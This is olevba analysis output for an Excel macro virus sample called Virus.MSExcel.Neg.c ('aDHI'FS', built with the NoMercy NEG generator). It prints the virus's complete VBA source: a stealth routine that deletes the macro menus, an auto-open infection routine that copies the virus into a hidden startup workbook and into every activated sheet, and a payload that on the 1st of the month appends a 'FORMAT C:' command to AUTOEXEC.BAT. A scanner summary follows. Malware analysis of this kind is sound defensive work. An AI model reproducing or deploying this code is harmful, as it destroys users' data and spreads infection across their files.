olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Neg.c-208b7b9fde21defe401efc6db8ea94a589c517b3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO aDHIFS.bas 
in file: Virus.MSExcel.Neg.c-208b7b9fde21defe401efc6db8ea94a589c517b3 - OLE stream: '_VBA_PROJECT_CUR/VBA/aDHIFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'------------ >>>> BEGIN CUT! <<<< --------------
'------------------------------------------------
'Generated with NEG !!. Please include this text
'------------------------------------------------
'NEG is Trademark of NoMercy
'Date generated  : 2- 5- 1998
'VirusName:  aDHI'FS!
'Author:  Adhi Fachriansyah S And Mehonx'S !
'Module Name:  aDHIFS
'Template: ADHIS.XLM

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
'>>---------------------------------[Begin Stealth Routine]-----
MenuBars(xlWorksheet).Reset
MenuBars(xlModule).Reset
MenuBars(xlNoDocuments).Reset
MenuBars(xlInfo).Reset
MenuBars(xlChart).Reset
MenuBars(xlWorksheet).Menus("Tools").MenuItems("---").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("--").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Delete...").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlWorksheet).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("---").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("--").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlChart).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("Assig&n Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("--").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Record New Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Unhide...").Delete
'>>---------------------------------[End of Stealth Routine]-----
    
    
'>>---------------------------------[Begin Infection Routine]-----
If cek_global() Then 'check on global!
    GoTo FuckSheet:    'found?
Else
    infectglobal     'Lound the speaker we want dance :)
End If
FuckSheet:
Application.OnSheetActivate = "ADHIS.XLM!Fuck"
bye:
End Sub

Function cek_global() As Boolean
Attribute cek_global.VB_ProcData.VB_Invoke_Func = " \n14"
cek_global = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "ADHIS.XLM" Then
    For y = 1 To Application.Workbooks("ADHIS.XLM").Modules.Count
        If Application.Workbooks("ADHIS.XLM").Modules(y).Name = "aDHIFS" Then
            cek_global = True
        End If
    Next y
    End If
Next x
End Function

Function infectglobal()
Attribute infectglobal.VB_ProcData.VB_Invoke_Func = " \n14"
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\ADHIS.XLM"
  Workbooks.Open (Application.StartupPath + "\ADHIS.XLM")
  Windows("ADHIS.XLM").Visible = False
 Application.Workbooks("ADHIS.XLM").Save
End Function

Function inFuckIt() As Boolean
Attribute inFuckIt.VB_ProcData.VB_Invoke_Func = " \n14"
activebook = ActiveWorkbook.Name
inFuckIt = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "aDHIFS" Then
            inFuckIt = True
   End If
Next y
End Function

Sub Fuck()
Attribute Fuck.VB_ProcData.VB_Invoke_Func = " \n14"
    oactivebook = ActiveWorkbook.Name
    If inFuckIt() Then 'already fucked?
    GoTo bye2
    Else
    End If
    Application.ScreenUpdating = False
    Application.Windows("ADHIS.XLM").Visible = True
    Workbooks("ADHIS.XLM").Activate
    Sheets("aDHIFS").Visible = True
    Workbooks("ADHIS.XLM").Sheets("aDHIFS").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("aDHIFS").Visible = False
    Workbooks("ADHIS.XLM").Sheets("aDHIFS").Visible = False
    Windows("ADHIS.XLM").Visible = False
bye2:
Close
End Sub
'>>---------------------------------[End of Infection Routine]-----

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo bye3
Application.DisplayAlerts = False
Application.Workbooks("ADHIS.XLM").Save
If Day(Date) = "1" Then
'>>---------------------------------[Begin of Fuck HDD Routine]-----
Open "C:\AUTOEXEC.BAT" For Input As #1
Close
SetAttr "C:\AUTOEXEC.BAT", vbNormal
Open "C:\AUTOEXEC.BAT" For Append As #1
Print #1, " @ECHO OFF"
Print #1, " CLS"
Print #1, " FORMAT C: /U /C /S /AUTOTEST > NUL"
Close #1
SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
'>>---------------------------------[End of Fuck HDD Routine]-----
'>>---------------------------------[Begin of Your Massages Routine]-----
    MsgBox "Your Files Is Being Infected By. Virus aDHI'FS For Detailed Information About US Please Visit me at : http://www.geocities.com/athens/olympus/1903/first.html or http://www.focus-asia.com/home/NoMercyVirusTeam or Contact Person at MUARA VIRUS WRITER's at 0341-462-989 wiTH Mr. nAWAW ....", 48
'>>---------------------------------[End of Your Massages Routine]-----
Else
End If
bye3:
End Sub
'------------ >>>>  END CUT! <<<< -----------
'Thank's for Using NoMercy Product!
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Neg.c-208b7b9fde21defe401efc6db8ea94a589c517b3 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Neg.c-208b7b9fde21defe401efc6db8ea94a589c517b3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Neg.c-208b7b9fde21defe401efc6db8ea94a589c517b3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Neg.c-208b7b9fde21defe401efc6db8ea94a589c517b3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  aDHIF
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.geocities|URL                                          |
|          |.com/athens/olympus/|                                             |
|          |1903/first.html     |                                             |
|IOC       |http://www.focus-asi|URL                                          |
|          |a.com/home/NoMercyVi|                                             |
|          |rusTeam             |                                             |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

